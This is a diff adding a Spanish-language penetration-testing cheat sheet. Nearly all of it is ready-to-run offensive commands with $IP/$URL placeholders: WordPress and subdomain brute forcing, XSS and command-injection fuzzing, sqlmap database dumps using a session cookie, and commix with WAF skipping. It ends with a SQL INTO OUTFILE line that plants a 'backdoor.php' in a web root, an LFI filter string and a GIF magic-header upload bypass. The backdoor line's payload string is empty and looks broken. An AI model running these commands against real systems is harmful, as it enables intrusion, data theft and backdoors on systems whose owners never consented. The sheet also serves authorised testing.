@@ -1,0 +1,160 @@
+//////////////////////////// ARSENAL DE HACKING \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+==============================================================================
+                    << UTILIDADES AVANZADAS DE PENTESTING >>
+==============================================================================
+
+[+]------------------------[ RECONOCIMIENTO ]------------------------------[+]
+
+   [*] NMAP
+   |=======
+   |  > Escaneo completo:
+   |    nmap -p- -sT -sV -A $IP
+   |
+   |  > Escaneo de servicios:
+   |    nmap -p- -sC -sV $IP --open
+   |
+   |  > Escaneo de vulnerabilidades:
+   |    nmap -p- --script=vuln $IP
+   |
+   |  > Métodos HTTP:
+   |    nmap --script http-methods --script-args http-methods.url-path='/website'
+   |
+   |  > Enumeración de recursos compartidos SMB:
+   |    nmap --script smb-enum-shares -p445 $IP
+   |
+   |  > Métodos HTTP en puertos específicos:
+   |    nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/directory/goes/here'
+
+   [*] EXTRACCIÓN DE IPs
+   |=====================
+   |  > De un archivo:
+   |    grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' FILE
+   |
+   |  > De la salida de nmap:
+   |    grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' nmapfile.txt
+
+   [*] WPSCAN
+   |==========
+   |  > Enumeración básica:
+   |    wpscan --url $URL --disable-tls-checks --enumerate p --enumerate t --enumerate u
+   |
+   |  > Fuerza bruta:
+   |    wpscan --url $URL --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt
+   |
+   |  > Detección agresiva de plugins:
+   |    wpscan --url $URL --enumerate p --plugins-detection aggressive
+
+   [*] NIKTO
+   |=========
+   |  > Escaneo con SSL y evasión:
+   |    nikto --host $IP -ssl -evasion 1
+
+   [*] DNS RECON
+   |============
+   |  > Reconocimiento de DNS:
+   |    dnsrecon -d yourdomain.com
+
+   [*] GOBUSTER
+   |===========
+   |  > Búsqueda de directorios:
+   |    gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30
+   |
+   |  > Búsqueda de archivos:
+   |    gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30
+   |
+   |  > Fuerza bruta de subdominios:
+   |    gobuster dns -d domain.org -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 30
+
+[+]------------------------[ FUZZING Y ATAQUES WEB ]----------------------[+]
+
+   [*] WFUZZ
+   |========
+   |  > Fuzzing XSS:
+   |    wfuzz -c -z file,/usr/share/SecLists/Fuzzing/XSS/XSS-BruteLogic.txt "$URL"
+   |    wfuzz -c -z file,/usr/share/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt "$URL"
+   |
+   |  > Inyección de comandos (POST):
+   |    wfuzz -c -z file,/usr/share/SecLists/Fuzzing/command-injection-commix.txt -d "doi=FUZZ" "$URL"
+   |
+   |  > Test de existencia de parámetros:
+   |    wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"
+   |
+   |  > Fuzzing de directorios (autenticado):
+   |    wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d "SESSIONID=value" "$URL"
+   |
+   |  > Fuzzing de archivos (autenticado):
+   |    wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d "SESSIONID=value" "$URL"
+   |
+   |  > Fuzzing de directorios (grande):
+   |    wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"
+   |
+   |  > Fuzzing de palabras:
+   |    wfuzz -c -z file,/usr/share/SecLists/Discovery/Web-Content/raft-large-words.txt --hc 404 "$URL"
+   |
+   |  > Fuzzing de usuarios:
+   |    wfuzz -c -z file,/usr/share/SecLists/Usernames/top-usernames-shortlist.txt --hc 404,403 "$URL"
+
+   [*] SQLMAP
+   |=========
+   |  > Inyección SQL básica:
+   |    sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
+   |
+   |  > Dump de base de datos:
+   |    sqlmap -u $URL --threads=2 --time-sec=10 --level=4 --risk=3 --dump
+   |
+   |  > Con cookie de sesión:
+   |    sqlmap -u "<URL>" --cookie "PHPSESSID=6c5mpfn0isnannuqesq9rcli84" --dbs --dbms=mysql --batch
+
+   [*] COMMIX
+   |=========
+   |  > Inyección de comandos avanzada:
+   |    commix --url="https://supermegaleetultradomain.com?parameter=" --level=3 --force-ssl --skip-waf --random-agent
+
+[+]------------------------[ ENUMERACIÓN Y RECON SOCIAL ]----------------[+]
+
+   [*] SMTP USER ENUM
+   |=================
+   |  > Enumeración VRFY:
+   |    smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+   |
+   |  > Enumeración EXPN:
+   |    smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+   |
+   |  > Enumeración RCPT:
+   |    smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+
+   [*] THE HARVESTER
+   |================
+   |  > Recolección de información:
+   |    theharvester -d domain.org -l 500 -b google
+
+[+]------------------------[ UTILIDADES DIVERSAS ]-----------------------[+]
+
+   [*] VERIFICACIÓN DE EJECUCIÓN DE COMANDOS
+   |========================================
+   |  > Captura de pings ICMP:
+   |    tcpdump -i any -c5 icmp
+
+   [*] DESCUBRIMIENTO DE RED
+   |========================
+   |  > Escaneo de red local:
+   |    netdiscover /r 0.0.0.0/24
+
+   [*] INYECCIÓN SQL
+   |================
+   |  > Creación de backdoor:
+   |    SELECT "" into outfile "/var/www/WEROOT/backdoor.php";
+
+   [*] LFI (LOCAL FILE INCLUSION)
+   |=============================
+   |  > Filtro PHP para codificación base64:
+   |    php://filter/convert.base64-encode/resource=
+
+   [*] UPLOAD DE IMÁGENES
+   |=====================
+   |  > Cabecera GIF mágica:
+   |    GIF89a1
+
+==============================================================================
+                << FIN DE LAS UTILIDADES AVANZADAS DE PENTESTING >>
+==============================================================================
